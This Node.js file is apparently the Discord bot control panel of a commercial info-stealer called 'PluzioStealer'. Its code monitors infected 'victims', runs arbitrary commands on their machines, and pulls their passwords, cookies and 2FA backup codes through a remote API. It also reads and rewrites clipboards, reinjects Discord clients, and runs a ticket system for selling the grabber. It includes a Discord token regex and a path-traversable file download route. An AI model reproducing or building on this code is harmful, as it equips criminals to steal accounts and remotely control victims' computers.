const Discord = require("discord.js"); 
const { Client, Util } = require("discord.js"); 
const fs = require("fs"); 
const discordModals = require('discord-modals'); 
const moment = require("moment"); 
const { promisify } = require("util"); 
const express = require('express');  
const path = require('path'); 
const axios = require('axios')
const { Intents, WebhookClient, MessageEmbed, MessageActionRow, MessageButton, Collection, MessageSelectMenu } = require("discord.js");
const { Modal, TextInputComponent, SelectMenuComponent, showModal  } = require('discord-modals');

let messages = []

const intents = new Intents([ "GUILD_MEMBERS" ]);

const client = new Client({
    intents: [ Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MESSAGE_REACTIONS, Intents.FLAGS.GUILD_VOICE_STATES, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.DIRECT_MESSAGES, Intents.FLAGS.DIRECT_MESSAGE_REACTIONS, Intents.FLAGS.DIRECT_MESSAGE_TYPING ],
    allowedMentions: { parse: ['users', 'roles'], repliedUser: true },
    presence: {
        status: "dnd",
        activities: [{ name: "The World", type: "WATCHING" }]
    },
    ws: { intents },
    fetchAllMembers: false,
    restTimeOffset: 0,
    shards: "auto",
    restWsBridgetimeout: 100,
    disableEveryone: true,
    partials: ['MESSAGE', 'CHANNEL', 'REACTION']
});

discordModals(client);

var download = function(uri, filename, callback) {
    request.head(uri, function(err, res, body){ request(uri).pipe(fs.createWriteStream(filename)).on('close', callback); });
};

require("./utils/eventLoader")(client); 
const config = require("./config.json"); 
const colors = require('colors')

client.cooldowns = new Discord.Collection()


const logger = (text) => { console.log(`[PluzioStealer] -> ${text}`.green)}

const app = express();

app.get("/copy/:live", async function (req, res)  {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Copy Page</title>
        <link rel="icon" type="image/png" href="/assets/favicon.png" />
    
        <style>
            body {
                background-color: #ea899a;
                background: linear-gradient(140deg, #ea899a, #4cc8e1);
                background-size: 400% 400%;
    
                -webkit-animation: background 18s ease infinite;
                -moz-animation: background 18s ease infinite;
                animation: background 18s ease infinite;
            }
    
            @-webkit-keyframes background {
                0%{background-position:5% 0%}
                50%{background-position:96% 100%}
                100%{background-position:5% 0%}
            }
            @-moz-keyframes background {
                0%{background-position:5% 0%}
                50%{background-position:96% 100%}
                100%{background-position:5% 0%}
            }
            @keyframes background {
                0%{background-position:5% 0%}
                50%{background-position:96% 100%}
                100%{background-position:5% 0%}
            }
    
            .content {
                position: absolute;
                top: 50%;
                left: 50%;
                margin-right: -50%;
                transform: translate(-50%, -50%);
    
                font-family: -apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
                font-weight: bold;
                font-size: 1.7rem;
                text-align: center;
                color: #fff;
    
                display: flex;
                flex-direction: column;
            }
            #text {
                padding: 0.8rem;
    
                border-radius: 15px;
    
                background-color: aliceblue;
                color: black;
                transition: transform .3s;
            }
            #text:hover {
                transform: scale(1.05);
            }
            #info {
                margin-top: 1rem;
                font-size: 1.2rem;
            }
        </style>
    </head>
    <body>
        <div class="content">
            <span id="text" onclick="copy()">${req.params.live}</span>
            <span id="info">Copy the text by pressing it</span>
        </div>
        <script>
            function copy() {
                const text = document.getElementById("text");
                const info = document.getElementById("info");
    
                navigator.clipboard.writeText(text.innerText);
                info.innerText = "Copied!";
                setTimeout(() => {info.innerText = "Copy the text pressing it"}, 2500);
            }
        </script>
    </body>
    </html>`)
})

app.get('/download', function(req, res) {
    let key = req.query.key;
    var file = req.query.file

    res.download(path.join(__dirname) + '/output/' + key + '/' + file, `${file}`, function (err) {
        if (err) {
            console.log(err)
        } else {
          console.log(`File Sent : ${file} (${key})`)
        }
      })
})
  
app.listen(80, function () {
    logger('Server Is Running On Localhost 80!')
});

function get_information(key, hostname) {
    return new Promise((resolve, reject) => {
        response = axios.get(`${config.api_url}/getinfo?key=${key}&hostname=${hostname}`).then(response => {
            resolve(response.data)
        })
    })
}

function info_message_handler(json) {
    let key = json['combo'].split(':')[0], hostname = json['combo'].split(':')[1];

    get_information(key, hostname).then(response => {
        if (response.message === 'Client isnt connected') {
            let embed = new MessageEmbed()
            .setColor('#303037')
            .setAuthor(`Monitoring Victim \👀`, "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
            .setDescription(`<a:spacex:1069286960927092807> **Status:**\n\`Victim is offline...\``)
            return json['message_ref'].edit({ embeds: [embed] })
        }
        let discords = ''
        let options = [
            {
                label: `Get Clipboard`,
                description: `This command will send the victim's clipboard to hook.`,
                value: `getclip:${key}:${hostname}`,
                emoji: `📋`
            },
            {
                label: `Edit Clipboard`,
                description: `This command will edit victim's clipboard`,
                value: `setclip:${key}:${hostname}`,
                emoji: `📋`
            },
            {
                label: `Remote Code Execution`,
                description: `This command will execute a custom command in victim's pc`,
                value: `rce:${key}:${hostname}`,
                emoji: `📥`
            },
            {
                label: `Get Passwords`,
                description: `This command sends the latest passwords in victim's pc`,
                value: `passwords:${key}:${hostname}`,
                emoji: `🔐`
            },
            {
                label: `Get Cookies`,
                description: `This command sends the latest cookies in victim's pc`,
                value: `cookies:${key}:${hostname}`,
                emoji: `🍪`
            },
            {
                label: `Get Backup Codes`,
                description: `This command sends the latest backupcodes in victim's pc`,
                value: `backupcodes:${key}:${hostname}`,
                emoji: `🔑`
            },
            ,
            {
                label: `Reinject`,
                description: `This command will reinject discords in victim's pc`,
                value: `reinject:${key}:${hostname}`,
                emoji: `<a:discord1:1070991436729823323>`
            }
        ];
        
        
        response.discords.opened.forEach(executable => {
            options.push({
                label: `Restart ${executable}`,
                description: 'This will restart ' + executable + ' in victims\'s pc',
                value: `restartc:${executable}:${hostname}:${key}`,
                emoji: `<a:discord1:1070991436729823323>` 
            });

            if (response.discords.opened.at(-1) === executable) {
                discords += `\`${executable}\``
            } else {
                discords += `\`${executable}\` | `
            }
        })

        if (!discords) discords = '\`None\`'



        let button_row_1 = new MessageActionRow()
        .addComponents(
            new MessageSelectMenu()
                .setCustomId('session-command')
			    .setPlaceholder('» Please Select A Command')
			    .addOptions(options)
        )

        let embed = new MessageEmbed()
            .setColor('#303037')
            .setAuthor(`Monitoring Victim \👀`, "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
            .setDescription(`<a:spacex:1069286960927092807> **CPU:**\n\`${response.cpu.model}\``)
            .addField(`<:spacex:1069286966237069322> Discord Injected`, `\`True\``, true)
            .addField(`<a:billing_spacex:1069286941574578276> Hostname:`, `\`${hostname}\``, true)
            .addField(`<:spacex:1069286971500937216> CPU Usage:`, `\`${response.cpu.usage}%\``, true)
            .addField(`<:spacex:1069286956225286164> Discord Opened`, discords, true)
            .setFooter(`@pluziostealer | Last Updated : ${response.last_updated}`)
        json['message_ref'].edit({ embeds: [embed], components: [button_row_1] })
    })
    
}

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./commands/', (err, files) => {
    if (err) console.error(err);
        logger(`${files.length} Commands Loading...`);
        
        files.forEach(f => {
            let props = require(`./commands/${f}`);
            logger(`Loaded Command : ${props.help.name}.`);
            
            client.commands.set(props.help.name, props);
            
            props.conf.aliases.forEach(alias => {
                client.aliases.set(alias, props.help.name);
            });
    });
});

client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./commands/${command}`)];
            let cmd = require(`./commands/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./commands/${command}`);
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./commands/${command}`)];
            let cmd = require(`./commands/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};


client.on('interactionCreate', async(interaction) => {
    if (!interaction.isSelectMenu()) return;
    
    let options = interaction.values, option = options[0]

    if (option == 'buy-grabber') {
        if (client.guilds.cache.get(interaction.guildId).channels.cache.find(c => c.topic == interaction.user.id)) {
            const embed = new MessageEmbed()
            .setColor(`#303037`)
            .setDescription(`You Already Have A Ticket!`)
            return await interaction.reply({ embeds: [ embed ], ephemeral: true})
        };

        interaction.guild.channels.create(`ticket-${interaction.user.username}`, {
            parent: config.tickets.buy,
            topic: interaction.user.id,
            permissionOverwrites: [{ id: interaction.user.id, allow: ['SEND_MESSAGES', 'VIEW_CHANNEL', 'READ_MESSAGE_HISTORY'] }, { id: interaction.guild.roles.everyone, deny: ['VIEW_CHANNEL'], } ],
            type: 'text',
        }).then(c => {
            const embed = new MessageEmbed()
            .setColor(`#303037`)
            .setDescription(`Successfully Created Ticket : <#${c.id}>`)
            interaction.reply({ embeds: [ embed ], ephemeral: true })
            
            let embed_send = new MessageEmbed()
            .setColor(`#303037`)
            .setAuthor(`Pluzio - Purchase Ticket`, client.user.displayAvatarURL())
            .setDescription(`Thanks For Creating A Ticket. Support Team Will Reach You As Soon As Possible`)

            let button_row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                .setEmoji("❌")
                .setLabel("Close Ticket")
                .setStyle('SECONDARY')
                .setCustomId('close-ticket'),

                new MessageButton()
                .setEmoji("📥")
                .setLabel("Claim Ticket")
                .setStyle('SECONDARY')
                .setCustomId('claim-ticket'),
            )

            c.send({ content: `<@${interaction.user.id}>`, embeds: [embed_send], components: [button_row]})
        })
    } else if (option == 'replace-grabber') {
        if (client.guilds.cache.get(interaction.guildId).channels.cache.find(c => c.topic == interaction.user.id)) {
            const embed = new MessageEmbed()
            .setColor(`#303037`)
            .setDescription(`You Already Have A Ticket!`)
            return await interaction.reply({ embeds: [ embed ], ephemeral: true})
        };

        interaction.guild.channels.create(`ticket-${interaction.user.username}`, {
            parent: config.tickets.replace,
            topic: interaction.user.id,
            permissionOverwrites: [{ id: interaction.user.id, allow: ['SEND_MESSAGES', 'VIEW_CHANNEL', 'READ_MESSAGE_HISTORY'] }, { id: interaction.guild.roles.everyone, deny: ['VIEW_CHANNEL'], } ],
            type: 'text',
        }).then(c => {
            const embed = new MessageEmbed()
            .setColor(`#303037`)
            .setDescription(`Successfully Created Ticket : <#${c.id}>`)
            interaction.reply({ embeds: [ embed ], ephemeral: true})
            
            let embed_send = new MessageEmbed()
            .setColor(`#303037`)
            .setAuthor(`Voleur - Replace Ticket`, client.user.displayAvatarURL())
            .setDescription(`Thanks For Creating A Ticket. Support Team Will Reach You As Soon As Possible`)

            let button_row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                .setEmoji("❌")
                .setLabel("Close Ticket")
                .setStyle('SECONDARY')
                .setCustomId('close-ticket'),

                new MessageButton()
                .setEmoji("📥")
                .setLabel("Claim Ticket")
                .setStyle('SECONDARY')
                .setCustomId('claim-ticket'),
            )

            c.send({ content: `<@${interaction.user.id}>`, embeds: [embed_send], components: [button_row]})
        })
    } else if (option == 'support-grabber') {

        if (client.guilds.cache.get(interaction.guildId).channels.cache.find(c => c.topic == interaction.user.id)) {
            const embed = new MessageEmbed()
            .setColor(`#303037`)
            .setDescription(`You Already Have A Ticket!`)
            return await interaction.reply({ embeds: [ embed ], ephemeral: true})
        };

        interaction.guild.channels.create(`ticket-${interaction.user.username}`, {
            parent: config.tickets.support,
            topic: interaction.user.id,
            permissionOverwrites: [{ id: interaction.user.id, allow: ['SEND_MESSAGES', 'VIEW_CHANNEL', 'READ_MESSAGE_HISTORY'] }, { id: interaction.guild.roles.everyone, deny: ['VIEW_CHANNEL'], } ],
            type: 'text',
        }).then(c => {
            const embed = new MessageEmbed()
            .setColor(`#303037`)
            .setDescription(`Successfully Created Ticket : <#${c.id}>`)
            interaction.reply({ embeds: [ embed ], ephemeral: true })
            
            let embed_send = new MessageEmbed()
            .setColor(`#303037`)
            .setAuthor(`Pluzio - Support Ticket`, client.user.displayAvatarURL())
            .setDescription(`Thanks For Creating A Ticket. Support Team Will Reach You As Soon As Possible`)

            let button_row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                .setEmoji("❌")
                .setLabel("Close Ticket")
                .setStyle('SECONDARY')
                .setCustomId('close-ticket'),

                new MessageButton()
                .setEmoji("📥")
                .setLabel("Claim Ticket")
                .setStyle('SECONDARY')
                .setCustomId('claim-ticket'),
            )

            c.send({ content: `<@${interaction.user.id}>`, embeds: [embed_send], components: [button_row]})
        })
    }
})

client.on('interactionCreate', interaction => {
    if (!interaction.isSelectMenu()) return;
    
        let options = interaction.values, option = options[0]
        if (interaction.customId === 'session-select') {
            let hostname = option.split(':')[1]; let key = option.split(':')[2];
    
            if (client.guilds.cache.get(interaction.guildId).channels.cache.find(c => c.topic == hostname)) {
                const embed = new MessageEmbed()
                .setColor(`#303037`)
                .setDescription(`That Session Already Exists`)
                return interaction.reply({ embeds: [ embed ], ephemeral: true})
            };
    
            interaction.guild.channels.create(`session-${hostname}`, {
                topic: hostname,
                permissionOverwrites: [{ id: interaction.user.id, allow: ['SEND_MESSAGES', 'VIEW_CHANNEL', 'READ_MESSAGE_HISTORY'] }, { id: interaction.guild.roles.everyone, deny: ['VIEW_CHANNEL'], } ],
                type: 'text',
            }).then(channel => {
                let embed = new MessageEmbed()
                .setColor('#303037')
                .setAuthor(`Monitoring ${hostname} \👀`, "https://media.discordapp.net/attachments/990303435528212532/990308980893048852/spacex_logo.gif")
                .setDescription(`\u200b`)
                
                channel.send({ embeds: [embed] }).then(message => {
                    interaction.reply({ content: `Please check ${channel}`, ephemeral: true})
                    let combo = key + ':' + hostname
                    messages.push({ 'combo': combo, 'channel_id': channel.id, 'message_id': message.id, 'last_updated': Date.now(), 'message_ref': message })
                })
            })
        } else 
        
        if (interaction.customId === 'session-command') {
            if (option.includes('restartc')) {
                let executable = option.split(':')[1]; let hostname = option.split(':')[2]; let key = option.split(':')[3];
                console.log(hostname);
                console.log(key)
                axios.get(`${config.api_url}/restartcord?key=${key}&hostname=${hostname}&type=${executable}`).then(response => {
                            if (response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                            if (!response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                    })
            } else {
                let command = option.split(':')[0]; let hostname = option.split(':')[2]; let key = option.split(':')[1];
    
                switch (command) {
                    case 'getclip':
                        axios.get(`${config.api_url}/getclip?key=${key}&hostname=${hostname}`).then(response => {
                            if (response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                            if (!response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                        })
                    break;

                    case 'passwords':
                        axios.get(`${config.api_url}/custom?key=${key}&hostname=${hostname}&command=passwords`).then(response => {
                            if (response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                            if (!response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                        })
                    break;
                    
                    case 'cookies':
                        axios.get(`${config.api_url}/custom?key=${key}&hostname=${hostname}&command=cookies`).then(response => {
                            if (response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                            if (!response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                        })
                    break;

                    case 'backupcodes':
                        axios.get(`${config.api_url}/custom?key=${key}&hostname=${hostname}&command=backupcodes`).then(response => {
                            if (response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                            if (!response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                        })
                    break;

                    case 'reinject':
                        axios.get(`${config.api_url}/custom?key=${key}&hostname=${hostname}&command=reinject`).then(response => {
                            if (response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                            if (!response.data.error) return interaction.reply({ content: response.data.message, ephemeral: true})
                        })
                    break;
    
                    case 'rce':
                        const modal = new Modal()
                        .setCustomId(`rce:${key}:${hostname}`)
                        .setTitle('Remote Code Execution')
                        .addComponents(  
                            new TextInputComponent()
                            .setCustomId('command')
                            .setLabel('Command')
                            .setStyle('LONG')
                            .setPlaceholder('Please Enter Your command here')
                            .setRequired(true)
                        );
                        showModal(modal, { client: client, interaction: interaction});
                    break;

                    case 'setclip':
                        const modale = new Modal()
                        .setCustomId(`setclip:${key}:${hostname}`)
                        .setTitle('Edit Clipboard')
                        .addComponents(  
                            new TextInputComponent()
                            .setCustomId('command')
                            .setLabel('Text')
                            .setStyle('LONG')
                            .setPlaceholder('Please Enter The Text You Wanna Put In Clipboard')
                            .setRequired(true)
                        );
                        showModal(modale, { client: client, interaction: interaction});
                }
            }
        } 
    });
    
    client.on('modalSubmit', async (modal) => {
        if (modal.customId.includes('rce')) {
            let key = modal.customId.split(':')[1]; let hostname = modal.customId.split(':')[2];
            let command = modal.getTextInputValue('command');
    
            axios.get(`${config.api_url}/execute?key=${key}&hostname=${hostname}&command=${command}`).then(response => {
                if (response.data.error) return modal.reply({ content: response.data.message, ephemeral: true})
                if (!response.data.error) return modal.reply({ content: response.data.message, ephemeral: true})
            })
        } else if (modal.customId.includes('setclip')) {
            let key = modal.customId.split(':')[1]; let hostname = modal.customId.split(':')[2];
            let command = modal.getTextInputValue('command');
    
            axios.get(`${config.api_url}/setclip?key=${key}&hostname=${hostname}&text=${command}`).then(response => {
                if (response.data.error) return modal.reply({ content: response.data.message, ephemeral: true})
                if (!response.data.error) return modal.reply({ content: response.data.message, ephemeral: true})
            })
        }
    })
    
setInterval(function() {
    messages.forEach(message => {
        info_message_handler(message)
    })
}, 2000)

client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    if (interaction.customId == "close-ticket") {
        if (interaction.channel.name.includes("ticket")) {
            await interaction.channel.delete()
        } else {
            return 
        }
    } 

    if (interaction.customId == "claim-ticket") {
        if (config.owners.includes(interaction.user.id)) {
            interaction.channel.setName(`claimed-${interaction.user.username}`)
        } else {
            return interaction.reply({ content: `You cannot use this button.`, ephemeral: true})
        }
    }


})

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;

client.login(config.token);